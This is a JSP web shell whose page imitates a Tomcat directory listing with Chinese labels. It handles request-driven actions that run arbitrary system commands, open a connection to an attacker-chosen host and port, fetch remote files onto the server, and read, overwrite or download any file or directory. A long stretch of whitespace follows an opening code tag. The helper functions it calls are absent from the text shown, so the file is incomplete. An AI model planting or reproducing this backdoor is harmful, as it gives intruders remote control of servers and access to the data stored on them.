<%@page import="java.util.zip.ZipEntry"%>
<%@page import="java.util.zip.ZipOutputStream"%>
<%@ page language="java" pageEncoding="UTF-8"%>
<%@page import="java.util.*"%>
<%@page import="java.text.SimpleDateFormat"%>
<%@ page import="java.io.*" %>
<%@ page import="java.net.*" %>
<%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
	
%>
<html>
<head>
<title><%=application.getServerInfo() %></title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<STYLE>
	H1 {color: white;background-color: #525D76;font-size: 22px;}
	H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;}
	BODY {font-family: Tahoma, Arial, sans-serif;font-size:12px;color: black;background-color: white;}
	A {color: black;}
	HR {color: #525D76;}
</STYLE>
<script> 
function get(p){
     document.getElementById('p').value = p;
     document.getElementById('action').value = "get";
     document.getElementById('fm').submit();
}
function saveFile(){
     document.getElementById('action').value = "saveFile";
     document.getElementById('fm').submit();
}
</script>
</head>
<body>
<%
	try{
		String action = request.getParameter("action");
		String path = isNotEmpty(request.getParameter("p"))?request.getParameter("p"):new File((isNotEmpty(application.getRealPath("/"))?application.getRealPath("/"):".")).getCanonicalPath();
		out.println("<form action=\"\" method=\"post\" id=\"fm\">");
		if(isNotEmpty(action) && !"get".equalsIgnoreCase(action)){
			if("shell".equalsIgnoreCase(action)){
				shell(request.getParameter("host"), Integer.parseInt(request.getParameter("port")));
			}else if("downloadL".equalsIgnoreCase(action)){
				download(request.getParameter("url"), request.getParameter("path"));
				out.println("文件下载成功.");
			}else if("exec".equalsIgnoreCase(action)){
				out.println("<h1>命令执行:</h1>");
				out.println("<pre>"+exec(request.getParameter("cmd"))+"</pre>");
			}else if("cat".equalsIgnoreCase(action)){
				out.println("<h1>文件查看:</h1>");
				out.println("<pre>"+cat(request.getParameter("path"))+"</pre>");
			}else if("auto".equalsIgnoreCase(action)){
				out.println("<h1>Auto:</h1>");
				out.println("<pre>"+auto(request.getParameter("url"),request.getParameter("fileName"),request.getParameter("cmd"))+"</pre>");
			}else if("download".equalsIgnoreCase(action)){
				response.setContentType("application/x-download");
				File file = new File(path,request.getParameter("fileName"));
				String fileName = file.isDirectory() ? file.getName()+".zip":file.getName();
				response.setHeader("Content-Disposition", "attachment; filename="+fileName);
				BufferedOutputStream bos = new BufferedOutputStream(response.getOutputStream());
				if(file.isDirectory()){
					ByteArrayOutputStream baos = new ByteArrayOutputStream();
					zip(baos, file);
					bos.write(baos.toByteArray());
					baos.close();
				}else{
					InputStream in = new FileInputStream(file);
					int len;
					byte[] buf = new byte[1024];
					while ((len = in.read(buf)) > 0) {
						bos.write(buf, 0, len);
					}
					in.close();
				}
				bos.close();
				out.clear();
				out = pageContext.pushBody();
				return ;
			}else if("saveFile".equalsIgnoreCase(action)){
				String file = request.getParameter("file");
				String data = request.getParameter("data");
				if(isNotEmpty(file) && isNotEmpty(data)){
					saveFile(new String(file.getBytes("ISO-8859-1"),"utf-8"),new String(data.getBytes("ISO-8859-1"),"utf-8"));
					out.println("<script>history.back(-1);alert('ok');</script>");
				}
			}
		}else{
			File file = new File(path);
			if(file.isDirectory()){
%>
<h1>Directory Listing For <%=path%></h1>
<HR size="1" noshade="noshade">
<table width="100%" cellspacing="0" cellpadding="5" align="center">
<tr>
<td align="left"><font size="+1"><strong>文件名</strong></font></td>
<td align="center"><font size="+1"><strong>文件大小</strong></font></td>
<td align="center"><font size="+1"><strong>文件下载</strong></font></td>
<td align="right"><font size="+1"><strong>最后修改时间</strong></font></td>
</tr>
<%					
				List<File> ls = new ArrayList<File>();
				ls.add(new File(file,".."));
				ls.addAll(Arrays.asList(file.listFiles()));
				for(int i = 0; i < ls.size(); i++){
					File f = ls.get(i);
					String fileCanonicalPath = f.getCanonicalPath().replaceAll("\\\\","/");
					out.println("<tr "+((i%2!=0)?"bgcolor=\"#eeeeee\"":"")+"><td align=\"left\">&nbsp;&nbsp;<a href=\"javascript:get('"+(f.getCanonicalPath().replaceAll("\\\\","/"))+"');\"><tt>"+f.getName()+"</tt></a></td><td align=\"center\"><tt>"+(f.length()/1000)+"KB</tt></td><td align=\"center\"><a href=\""+request.getContextPath()+request.getServletPath()+"?action=download&p="+path+"&fileName="+f.getName()+"\"><tt>下载</tt></a></td><td align=\"right\"><tt>"+new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(f.lastModified())) +"</tt></td></tr>");
				}
			}else{
				out.println("<h1>文件编辑:</h1>");
				out.println("File:<input type=\"text\" style=\"width:600px;\" name=\"file\" value=\""+path+"\" /><input type=\"button\" style=\"margin-left:20px;\" value=\"保存\" onclick=\"saveFile()\" /><span id=\"result\"></span><br/><br/>");
				out.println("<textarea style=\"width:100%;height:500px;\" name=\"data\">"+cat(path)+"</textarea>");
			}
		}
		out.println("<input type=\"hidden\" name=\"p\" id=\"p\" value=\""+path+"\"/><input type=\"hidden\" name=\"action\" id=\"action\" value=\"get\" /></form></table>");
		out.println("<HR size=\"1\" noshade=\"noshade\"><h3>"+application.getServerInfo()+"</h3></body></html>");
	}catch(Exception e){
		out.println("<pre>"+exceptionToString(e)+"</pre>");
	}
%>
